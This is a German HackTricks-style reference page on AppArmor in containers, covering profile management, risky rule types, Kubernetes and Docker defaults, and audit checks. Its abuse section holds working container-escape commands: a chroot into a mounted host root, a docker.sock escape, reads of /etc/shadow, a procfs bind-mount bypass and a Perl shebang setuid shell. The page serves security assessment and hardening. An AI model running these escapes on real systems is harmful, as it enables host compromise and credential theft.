# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Rolle bei der Container-Isolation

AppArmor ist ein **Mandatory Access Control**-System, das Einschränkungen über programmspezifische Profile anwendet. Im Gegensatz zu herkömmlichen DAC-Prüfungen, die stark von Benutzer- und Gruppenzugehörigkeiten abhängen, ermöglicht AppArmor dem Kernel, eine an den Prozess selbst gebundene Richtlinie durchzusetzen. In Container-Umgebungen ist dies wichtig, weil ein Workload möglicherweise über ausreichend herkömmliche Berechtigungen verfügt, um eine Aktion zu versuchen, und dennoch abgewiesen wird, weil sein AppArmor-Profil den betreffenden Pfad, das Mount-Verhalten, das Netzwerkverhalten oder die Verwendung einer Capability nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Der Zugriff auf das Dateisystem wird anhand von Pfadregeln bewertet und nicht anhand von Labels, wie es bei SELinux der Fall ist. Das macht AppArmor zugänglich und leistungsfähig, bedeutet aber auch, dass Bind-Mounts und alternative Pfadstrukturen sorgfältig berücksichtigt werden müssen. Wenn derselbe Inhalt des Hosts unter einem anderen Pfad erreichbar wird, entspricht die Wirkung der Richtlinie möglicherweise nicht dem, was der Operator zunächst erwartet hat.

## Rolle bei der Container-Isolation

Bei Sicherheitsüberprüfungen von Containern wird häufig bei Capabilities und seccomp aufgehört, aber AppArmor bleibt auch nach diesen Prüfungen relevant. Stellen Sie sich einen Container vor, der über mehr Berechtigungen verfügt als vorgesehen, oder einen Workload, der aus betrieblichen Gründen eine zusätzliche Capability benötigt. AppArmor kann den Dateizugriff, das Mount-Verhalten, das Networking und Ausführungsmuster weiterhin so einschränken, dass der offensichtlichste Missbrauchsweg blockiert wird. Deshalb kann das Deaktivieren von AppArmor "nur damit die Anwendung funktioniert" eine lediglich riskante Konfiguration unbemerkt in eine aktiv ausnutzbare verwandeln.

## Lab

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwenden Sie:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welchem Benutzer der aktuelle Container-Prozess ausgeführt wird:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist aufschlussreich. Im normalen Fall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom Runtime ausgewählte Profil gebunden ist. Im unconfined-Fall entfällt diese zusätzliche Einschränkungsebene.

Du kannst auch überprüfen, was Docker nach eigenen Angaben angewendet hat:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitverwendung

Docker kann ein standardmäßiges oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann ebenfalls in AppArmor-basierte Systeme integriert werden, obwohl bei SELinux-first-Distributionen häufig das andere MAC-System im Mittelpunkt steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene auf Nodes bereitstellen, die AppArmor tatsächlich unterstützen. LXC und verwandte Ubuntu-Familien-System-Container-Umgebungen verwenden AppArmor ebenfalls umfassend.

Der praktische Punkt ist, dass AppArmor kein „Docker-Feature“ ist. Es handelt sich um ein Host-Kernel-Feature, das mehrere Runtimes anwenden können. Unterstützt der Host es nicht oder wird die Runtime angewiesen, den Container unconfined auszuführen, ist der vermeintliche Schutz nicht wirklich vorhanden.

Für Kubernetes lautet die moderne API `securityContext.appArmorProfile`. Seit Kubernetes `v1.30` sind die älteren Beta-AppArmor-Annotations deprecated. Auf unterstützten Hosts ist `RuntimeDefault` das standardmäßige Profil, während `Localhost` auf ein Profil verweist, das bereits auf dem Node geladen sein muss. Das ist bei Reviews wichtig, weil ein Manifest AppArmor-bewusst wirken kann, während es weiterhin vollständig von der Unterstützung des Nodes und vorab geladenen Profilen abhängt.<sup>[[1]](#references)</sup>

Ein subtiler, aber nützlicher operativer Punkt ist, dass das explizite Setzen von `appArmorProfile.type: RuntimeDefault` strenger ist, als das Feld einfach wegzulassen. Wenn das Feld explizit gesetzt ist und der Node AppArmor nicht unterstützt, sollte die Admission fehlschlagen. Wenn das Feld weggelassen wird, kann die Workload weiterhin auf einem Node ohne AppArmor ausgeführt werden und erhält diese zusätzliche Confinement-Schicht schlicht nicht. Aus Sicht eines Angreifers ist dies ein guter Grund, sowohl das Manifest als auch den tatsächlichen Zustand des Nodes zu prüfen.<sup>[[1]](#references)</sup>

Auf Docker-fähigen AppArmor-Hosts ist `docker-default` das bekannteste Standardprofil. Dieses Profil wird aus Mobys AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige capability-basierte PoCs in einem Standard-Container weiterhin fehlschlagen. Im Großen und Ganzen erlaubt `docker-default` gewöhnliches Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert den Zugriff auf sensible Bereiche von `/sys`, blockiert Mount-Operationen und beschränkt ptrace, sodass es kein allgemeines Primitive zur Untersuchung des Hosts darstellt. Das Verständnis dieser Ausgangsbasis hilft dabei, zwischen „der Container verfügt über `CAP_SYS_ADMIN`“ und „der Container kann diese Capability tatsächlich gegen die für mich relevanten Kernel-Interfaces einsetzen“ zu unterscheiden.

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` gespeichert. Eine gängige Namenskonvention besteht darin, Schrägstriche im Pfad der ausführbaren Datei durch Punkte zu ersetzen. Ein Profil für `/usr/bin/man` wird beispielsweise üblicherweise als `/etc/apparmor.d/usr.bin.man` gespeichert. Dieses Detail ist sowohl bei der Verteidigung als auch bei Assessments wichtig, da sich die entsprechende Datei auf dem Host oft schnell finden lässt, sobald der Name des aktiven Profils bekannt ist.

Zu den nützlichen Verwaltungsbefehlen auf dem Host gehören:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer Referenz zur Container-Sicherheit wichtig sind, liegt darin, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in den complain mode versetzt und nach Änderungen an der Anwendung angepasst werden. Wenn ein Operator beim Troubleshooting dazu neigt, Profile in den complain mode zu versetzen und anschließend vergisst, die Erzwingung wiederherzustellen, kann der Container in der Dokumentation geschützt wirken, während er sich in der Realität wesentlich weniger restriktiv verhält.

### Erstellen und Aktualisieren von Profilen

`aa-genprof` kann das Verhalten einer Anwendung beobachten und interaktiv beim Erstellen eines Profils helfen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Profil-Template generieren, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn sich die Binary ändert und die Policy aktualisiert werden muss, kann `aa-logprof` in Logs gefundene Verweigerungen erneut abspielen und den Betreiber dabei unterstützen, zu entscheiden, ob sie erlaubt oder verweigert werden sollen:
```bash
sudo aa-logprof
```
### Logs

AppArmor-Verweigerungen sind häufig über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:
```bash
sudo aa-notify -s 1 -v
```
Dies ist im Betrieb und offensiv nützlich. Defenders verwenden es, um Profile zu verfeinern. Attackers verwenden es, um zu ermitteln, welcher genaue Pfad oder welche Operation verweigert wird und ob AppArmor die Kontrolle ist, die eine Exploit-Chain blockiert.

### Die genaue Profile-Datei identifizieren

Wenn ein Runtime für einen Container einen bestimmten AppArmor-Profilnamen anzeigt, ist es oft nützlich, diesen Namen der Profildatei auf dem Datenträger zuzuordnen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dies ist insbesondere bei der Überprüfung auf der Host-Seite nützlich, da es die Lücke zwischen „der Container sagt, dass er unter dem Profil `lowpriv` ausgeführt wird“ und „die tatsächlichen Regeln befinden sich in dieser spezifischen Datei, die geprüft oder neu geladen werden kann“ schließt.

### Regeln mit hoher Aussagekraft prüfen

Wenn du ein Profil lesen kannst, beschränke dich nicht auf einfache `deny`-Zeilen. Mehrere Regeltypen verändern maßgeblich, wie nützlich AppArmor gegen einen Container-Escape-Versuch ist:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: Führt die Ziel-Binary ohne Einschränkungen aus. Wenn ein erreichbarer Helper, eine Shell oder ein Interpreter unter `ux` erlaubt ist, sollte dies normalerweise als Erstes getestet werden.
- `px` / `Px` und `cx` / `Cx`: Führen beim exec Profilübergänge durch. Diese sind nicht automatisch problematisch, sollten aber geprüft werden, da ein Übergang in einem deutlich umfassenderen Profil als dem aktuellen enden kann.
- `change_profile`: Erlaubt es einem Task, sofort oder beim nächsten exec in ein anderes geladenes Profil zu wechseln. Wenn das Zielprofil schwächer ist, kann dies zum vorgesehenen Ausweg aus einer restriktiven Domain werden.
- `flags=(complain)`, `flags=(unconfined)` oder neuere `flags=(prompt)`: Diese sollten beeinflussen, wie viel Vertrauen du in das Profil setzt. `complain` protokolliert Verweigerungen, anstatt sie durchzusetzen, `unconfined` entfernt die Grenze, und `prompt` hängt von einem Userspace-Entscheidungspfad statt von einer rein durch den Kernel erzwungenen Verweigerung ab.
- `userns` oder `userns create,`: Neuere AppArmor-Policies können die Erstellung von User-Namespaces vermitteln. Wenn ein Container-Profil dies ausdrücklich erlaubt, bleiben verschachtelte User-Namespaces möglich, selbst wenn die Plattform AppArmor als Teil ihrer Hardening-Strategie verwendet.

Nützliches hostseitiges grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Diese Art von Audit ist oft nützlicher, als auf Hunderte gewöhnlicher Datei-Regeln zu starren. Wenn ein breakout davon abhängt, einen helper auszuführen, in einen neuen namespace einzutreten oder in ein weniger restriktives profile zu wechseln, ist die Antwort oft in diesen auf Übergänge ausgerichteten Regeln verborgen und nicht in den offensichtlichen Zeilen im Stil von `deny /etc/shadow r`.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen dies oft, während sie eine Anwendung debuggen, die fehlgeschlagen ist, weil das profile etwas Gefährliches oder Unerwartetes korrekt blockiert hat. Wenn das Flag in der Produktion bestehen bleibt, wurde die gesamte MAC-Schicht faktisch entfernt.

Ein weiteres subtileres Problem besteht in der Annahme, dass bind mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor auf Pfaden basiert, kann das Freigeben von host-Pfaden unter alternativen mount-Speicherorten schlecht mit Pfadregeln interagieren. Ein dritter Fehler besteht darin, zu vergessen, dass ein profile-Name in einer Konfigurationsdatei wenig bedeutet, wenn der host-Kernel AppArmor nicht tatsächlich durchsetzt.

## Missbrauch

Wenn AppArmor nicht vorhanden ist, können zuvor eingeschränkte Vorgänge plötzlich funktionieren: das Lesen sensibler Pfade über bind mounts, der Zugriff auf Teile von procfs oder sysfs, deren Nutzung schwieriger bleiben sollte, das Ausführen von mount-bezogenen Aktionen, sofern capabilities/seccomp dies ebenfalls erlauben, oder die Verwendung von Pfaden, die ein profile normalerweise verweigern würde. AppArmor ist oft der Mechanismus, der erklärt, warum ein auf capabilities basierender breakout-Versuch auf dem Papier „funktionieren sollte“, in der Praxis aber trotzdem fehlschlägt. Wird AppArmor entfernt, kann derselbe Versuch plötzlich erfolgreich sein.

Wenn du vermutest, dass AppArmor das Hauptbestandteil ist, das eine path-traversal-, bind-mount- oder mount-basierte Missbrauchskette verhindert, besteht der erste Schritt normalerweise darin, zu vergleichen, was mit und ohne ein profile zugänglich wird. Wenn beispielsweise ein host-Pfad innerhalb des Containers gemountet ist, solltest du zunächst prüfen, ob du ihn durchqueren und lesen kannst:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem über eine gefährliche Capability wie `CAP_SYS_ADMIN` verfügt, besteht einer der praxisnahesten Tests darin zu prüfen, ob AppArmor die Kontrolle ist, die Mount-Operationen oder den Zugriff auf sensible Kernel-Dateisysteme blockiert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein Host-Pfad bereits über einen bind mount verfügbar ist, kann der Verlust von AppArmor ein read-only information-disclosure-Problem auch in direkten Zugriff auf Host-Dateien verwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Punkt dieser Befehle ist nicht, dass AppArmor allein den breakout ermöglicht. Es geht darum, dass nach dem Entfernen von AppArmor viele auf filesystem- und mount-basierende Missbrauchspfade sofort getestet werden können.

### Vollständiges Beispiel: AppArmor deaktiviert + Host-Root eingebunden

Wenn der Container das Host-Root-Dateisystem bereits unter `/host` eingebunden hat, kann das Entfernen von AppArmor einen blockierten filesystem-basierten Missbrauchspfad in einen vollständigen host escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die Shell über das Host-Dateisystem ausgeführt wird, hat die Workload die Container-Grenze effektiv verlassen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime-Socket

Wenn die eigentliche Barriere AppArmor zum Schutz des Runtime-Status war, kann ein gemounteter Socket für einen vollständigen Escape ausreichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Der genaue Pfad hängt vom Mount-Punkt ab, aber das Ergebnis ist dasselbe: AppArmor verhindert den Zugriff auf die runtime API nicht mehr, und die runtime API kann einen Container starten, der den Host kompromittiert.

### Vollständiges Beispiel: Pfadbasierter Bind-Mount-Bypass

Da AppArmor pfadbasiert arbeitet, schützt die Absicherung von `/proc/**` nicht automatisch denselben procfs-Inhalt des Hosts, wenn er über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die Auswirkungen hängen davon ab, was genau gemountet wird und ob der alternative Pfad auch andere Kontrollen umgeht. Dieses Muster ist jedoch einer der deutlichsten Gründe dafür, dass AppArmor zusammen mit dem Mount-Layout und nicht isoliert bewertet werden muss.

### Vollständiges Beispiel: Shebang Bypass

Die AppArmor-Richtlinie zielt manchmal auf einen Interpreter-Pfad ab, ohne die Skriptausführung durch die Shebang-Verarbeitung vollständig zu berücksichtigen. Ein historisches Beispiel umfasste die Verwendung eines Skripts, dessen erste Zeile auf einen eingeschränkten Interpreter verweist:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Diese Art von Beispiel ist als Erinnerung daran wichtig, dass Profilabsicht und tatsächliche Ausführungssemantik voneinander abweichen können. Bei der Überprüfung von AppArmor in Container-Umgebungen verdienen Interpreter-Ketten und alternative Ausführungspfade besondere Aufmerksamkeit.

## Prüfungen

Das Ziel dieser Prüfungen besteht darin, schnell drei Fragen zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die Runtime tatsächlich ein Profil auf diesen Container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert die Workload nicht von der AppArmor-Einschränkung.
- Wenn `aa-status` anzeigt, dass AppArmor deaktiviert oder nicht geladen ist, ist jeder Profilname in der Runtime-Konfiguration größtenteils nur kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das oft der Grund, warum ein dateisystem- oder mount-basierter Abuse-Pfad funktioniert.
- Wenn `/sys/kernel/security/apparmor/profiles` das erwartete Profil nicht enthält, reicht die Runtime- oder Orchestrator-Konfiguration allein nicht aus.
- Wenn ein angeblich gehärtetes Profil Regeln wie `ux`, weitreichendes `change_profile`, `userns` oder `flags=(complain)` enthält, kann die praktische Grenze deutlich schwächer sein, als der Profilname vermuten lässt.

Wenn ein Container aus betrieblichen Gründen bereits über erweiterte Berechtigungen verfügt, macht die Aktivierung von AppArmor oft den Unterschied zwischen einer kontrollierten Ausnahme und einem deutlich umfassenderen Sicherheitsversagen.

## Laufzeitstandards

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig auf AppArmor-fähigen Hosts aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern es nicht überschrieben wird | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hostabhängig | AppArmor wird über `--security-opt` unterstützt, aber das genaue Standardverhalten hängt vom Host und der Runtime ab und ist weniger universell als Dockers dokumentiertes `docker-default`-Profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, lautet der Standard `RuntimeDefault`; er wird jedoch nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O unter Kubernetes | Folgt der Unterstützung durch Node und Runtime | Übliche von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; eine direkte Runtime-Konfiguration kann AppArmor ebenfalls vollständig überspringen |

Bei AppArmor ist die wichtigste Variable oft der **Host**, nicht nur die Runtime. Eine Profileinstellung in einem Manifest erzeugt keine Einschränkung auf einem Node, auf dem AppArmor nicht aktiviert ist.

## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
